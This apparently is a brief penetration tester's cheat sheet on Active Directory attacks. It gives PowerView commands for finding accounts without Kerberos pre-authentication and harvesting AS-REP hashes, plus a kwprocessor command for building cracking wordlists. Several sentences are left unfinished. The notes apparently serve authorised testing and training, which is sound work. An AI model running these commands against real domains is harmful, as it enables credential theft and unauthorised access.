## **More fun in AD**

Below are a collection of items to run within a new environment to check for

In addition the bloodhound and basic net enumeration try looking for the following:

Next try running

Powerup

as well as hamrj0y's powerview tips

[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)



Determine if kerberos pre-auth is not set

```
With Powerview

Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
Get-ASREPHash -UserName victim -Domain testlab.local -Verbose
Invoke-ASREPRoast -Verbose | fl
```

Note: A great tool for cracking hashes is kwprocessor

```
./kwp -z basechars/full.base keymaps/en.keymap routes/2-to-16-max-3-direction-changes.route > largekwpshift.txt
```



[http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)

